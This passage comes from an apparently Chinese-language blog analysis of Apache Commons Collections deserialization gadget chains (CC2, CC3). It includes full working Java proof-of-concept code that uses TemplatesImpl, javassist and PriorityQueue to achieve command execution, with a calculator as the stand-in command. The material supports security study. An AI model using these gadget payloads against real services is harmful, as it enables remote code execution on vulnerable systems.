<p>&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A; <code>AbstractTranslet</code> &#xFF0C;&#x9ED8;&#x8BA4;&#x72B6;&#x6001;&#x4E0B;<code>_transletIndex</code> &#x7684;&#x503C;&#x4E3A; -1&#xFF0C;&#x5982;&#x679C;&#x8FDB;&#x5165;&#x8FD9;&#x4E2A; if &#x6BD4;&#x8F83;&#x540E;&#xFF0C;&#x4F1A;&#x7ED9;<code>_transletIndex</code> &#x9644;&#x503C;&#x81F3;&#x5C11;&#x4E3A; 0&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4E5F;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8BBE;&#x7F6E;<code>_transletIndex</code>&#x7684;&#x503C;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD8;&#x662F;&#x4F1A;&#x8FDB;&#x5165;&#x5230;<code>_auxClasses</code> &#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x6B64;&#x65B9;&#x6CD5;&#x4F1A;&#x62A5;&#x51FA;&#x9519;&#x8BEF;&#xFF0C;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x3002;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133950227.png" alt></p>
<p>&#x56DE;&#x5230; <code>TemplatesImpl#getTransletInstance</code> &#x7684;&#x7B2C;&#x4E8C;&#x90E8;&#x5206;&#xFF0C;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x91CC;&#x4F1A;&#x8C03;&#x7528;&#x6211;&#x4EEC; static &#x4EE3;&#x7801;&#x5757;&#x7684;&#x4EE3;&#x7801;</p>
<p>&#x6784;&#x9020;&#x8C03;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x7ED3;&#x5408; javassist &#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A; RCE &#x7684; demo</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        <span class="hljs-comment">// &#x56E0;&#x4E3A;&#x4EE3;&#x7801;&#x4E2D;&#x5B58;&#x5728; _tfactory.getExternalExtensionsMap() &#x6240;&#x4EE5;&#x9700;&#x8981; _tfactory &#x8FDB;&#x884C;&#x8D4B;&#x503C; &#x4E0D;&#x80FD;&#x4E3A;null&#xFF0C;&#x8FD9;&#x91CC;&#x4E0E; JDK &#x7248;&#x672C;&#x6709;&#x5173;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>&#x6CBF;&#x7528;&#x4E4B;&#x524D; CC1 &#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x76EE;&#x524D;&#x7684;&#x6838;&#x5FC3;&#x76EE;&#x7684;&#x662F;&#x5BFB;&#x627E;&#x8C03;&#x7528; ChainedTransformer &#x7684; <code>transform</code> &#x7684;&#x7C7B;</p>
<p>&#x770B;&#x4E00;&#x4E0B; <code>TransformingComparator#compare</code> ,&#x5728;&#x4E0A;&#x9762;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x5019;&#x7ED9; <code>this.transformer</code> &#x9644;&#x503C;&#x4E3A;&#x4F20;&#x5165;&#x7684; transformer&#xFF0C;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x8C03;&#x7528; transform &#x65B9;&#x6CD5;&#xFF0C;&#x7B26;&#x5408;&#x6211;&#x4EEC;&#x7684;&#x6784;&#x9020;&#x6761;&#x4EF6;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212220401768.png" alt></p>
<p>&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x540E;&#x7EED;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x5BFB;&#x627E;&#x8C03;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x3002;&#x5229;&#x7528;&#x94FE;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#xFF0C;&#x6211;&#x4EEC;&#x5207;&#x6362;&#x5230;&#x6B63;&#x5411;&#x7684;&#x601D;&#x8DEF;</p>
<p><code>PriorityQueue#readObject</code> &#xFF0C;&#x6700;&#x540E;&#x4E00;&#x884C;&#x8C03;&#x7528;&#x4E86; <code>heapify</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212220910736.png" alt></p>
<p><code>PriorityQueue#heapify</code> &#x91CC;&#x8C03;&#x7528;&#x4E86; <code>siftDown</code> &#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#x8981;&#x6EE1;&#x8DB3; <code>int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0</code>&#x3002;&#x8FD9;&#x91CC; size &#x5982;&#x679C;&#x4E3A; 1 &#x7684;&#x8BDD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x53EA;&#x7ED9; PriorityQueue add &#x4E00;&#x4E2A;&#x503C;&#x7684;&#x65F6;&#x5019;&#xFF0C; <code>(size &gt;&gt;&gt; 1) - 1</code> &#x7B97;&#x51FA;&#x6765;&#x4E3A; -1&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5176;&#x6EE1;&#x8DB3; for &#x5FAA;&#x73AF;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;size &#x81F3;&#x5C11;&#x4E3A; 2</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212221022010.png" alt></p>
<p>&#x770B;&#x4E00;&#x4E0B; <code>PriorityQueue#siftDown</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212222808177.png" alt></p>
<p>&#x968F;&#x540E;&#x8C03;&#x7528;&#x5230;&#x5173;&#x952E;&#x7684;&#x65B9;&#x6CD5; <code>PriorityQueue#siftDownUsingComparator</code> </p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212222905993.png" alt></p>
<p>&#x5728;&#x6F2B;&#x957F;&#x7684;&#x8C03;&#x7528;&#x6808;&#x4E2D;&#xFF0C;&#x6700;&#x91CD;&#x8981;&#x7684;&#x53C2;&#x6570;&#x5C31;&#x662F; comparator&#x3002;&#x53EF;&#x63A7;&#x6211;&#x4EEC;&#x5373;&#x53EF; RCE</p>
<p>&#x4F18;&#x5316; payload &#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x7F51;&#x4E0A;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#x90FD;&#x4F1A;&#x7528;&#x53CD;&#x5C04;&#x53BB;&#x9644;&#x503C;&#xFF0C;&#x5176;&#x5B9E; PriorityQueue &#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x9644;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x89E6;&#x53D1;&#x591A;&#x6B21; payload&#x3002;</p>
<p><strong>fake CC2 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InstantiationException, NoSuchFieldException, IOException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(fakeChain);</span><br><span class="line">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);</span><br><span class="line">        queue.add(<span class="hljs-number">1</span>);</span><br><span class="line">        queue.add(<span class="hljs-number">2</span>);</span><br><span class="line">        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>CC2 &#x5176;&#x5B9E;&#x6838;&#x5FC3;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#x4E0D;&#x662F;&#x9760;&#x7684; ChainedTransformer &#x4E0E; InvokerTransformer &#x7B49;&#x7ED3;&#x5408;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x5B83;&#x53D8;&#x4E3A;&#x4E86;&#x4F7F;&#x7528; TemplatesImpl &#x8FD9;&#x4E2A;&#x7C7B;&#x6765;&#x8C03;&#x7528;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x524D;&#x6587; basics &#x7684;&#x5185;&#x5BB9;</p>
<p>&#x524D;&#x6587;&#x6211;&#x4EEC;&#x5229;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x7ED3;&#x5408; javassist &#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A; RCE demo</p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x7684;&#x4EFB;&#x52A1;&#x662F;&#x5982;&#x4F55;&#x8C03;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x4E0E;readObject &#x7ED3;&#x5408;</p>
<p>&#x56DE;&#x987E; InvokerTransformer&#xFF0C;&#x8C03;&#x7528;&#x5176; transform &#x65B9;&#x6CD5;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x63A7;  transform &#x65B9;&#x6CD5;&#x4E2D;&#x53C2;&#x6570;&#xFF0C;&#x4EE5;&#x53CA; <code>this.iMethodName</code> &#x5373;&#x53EF;&#x8C03;&#x7528;&#x4EFB;&#x610F;&#x7C7B;&#x7684;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213141618580.png" alt></p>
<p>&#x56DE;&#x987E;&#x4E4B;&#x524D; CC2 gadget chain &#x4E2D;&#x6267;&#x884C; transform &#x7684;&#x70B9;&#xFF0C;&#x53EA;&#x9700;&#x8981; obj1 &#x53EF;&#x63A7;&#xFF0C;&#x5219;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213142428801.png" alt></p>
<p><strong>TemplatesImpl &#x5229;&#x7528;&#x94FE; payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        Constructor constructor = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="hljs-string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);</span><br><span class="line">        <span class="hljs-comment">// javassist</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Demo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]{templates, <span class="hljs-number">1</span>};</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        queue_field.set(queue, queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        size.set(queue, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">     ObjectInputStream.readObject()</span><br><span class="line">       PriorityQueue.readObject()</span><br><span class="line">         PriorityQueue.heapify()</span><br><span class="line">             PriorityQueue.siftDown()</span><br><span class="line">               PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                 TransformingComparator.compare()</span><br><span class="line">                     InvokerTransformer.transform()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                TemplatesImpl.defineTransletClasses</span><br><span class="line">                                newInstance()</span><br><span class="line">                                 	Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>CommonsCollections2 &#x4E0D;&#x80FD;&#x5728; 3.1-3.2.1&#x7248;&#x672C;&#x5229;&#x7528;&#x6210;&#x529F;</p>
<p><strong>&#x6839;&#x672C;&#x539F;&#x56E0;&#x5728;&#x4E8E;CommonsCollections2&#x7684;payload&#x4E2D;&#x4F7F;&#x7528;&#x7684;TransformingComparator&#x5728;3.1-3.2.1&#x7248;&#x672C;&#x4E2D;&#x8FD8;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;Serializable&#x63A5;&#x53E3;&#xFF0C;&#x65E0;&#x6CD5;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;</strong></p>
</blockquote>
<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><h2 id="Basics-2"><a href="#Basics-2" class="headerlink" title="Basics"></a>Basics</h2><p>CC3 &#x76F8;&#x6BD4;&#x4E8E; CC1 &#x4E5F;&#x53EA;&#x662F;&#x66F4;&#x6539;&#x4E86;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;</p>
<p>&#x5148;&#x770B;&#x4E00;&#x4E0B; <code>InstantiateTransformer#transform</code>&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8C03;&#x7528;&#x6784;&#x9020;&#x51FD;&#x6570;&#x6765;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213020034643.png" alt></p>
<p>CC2 &#x91CC;&#x9762;&#x6211;&#x4EEC;&#x6539;&#x53D8;&#x4E86;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#x4E3A; <code>TemplatesImpl#newTransformer</code> &#x6765;&#x8C03;&#x7528;&#x3002;CC2&#x91CC;&#x89E6;&#x53D1; <code>TemplatesImpl#newTransformer</code>  &#x662F;&#x9760;&#x7684; <code>InvoerTransformer#transform</code>&#xFF0C;&#x4E14; <code>transform</code> &#x53C2;&#x6570;&#x53EF;&#x63A7;</p>
<p>CC3 &#x7528;&#x5230;&#x4E86; <code>TrAXFilter</code> &#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x5176;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x4F1A;&#x8C03;&#x7528; <code>templates.newTransformer()</code>&#xFF0C;&#x4E14; <code>templates</code> &#x53EF;&#x63A7;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213143732101.png" alt></p>
<p>&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x4E0A;&#x9762;&#x8BB2;&#x7684; <code>InstantiateTransformer#transform</code>&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        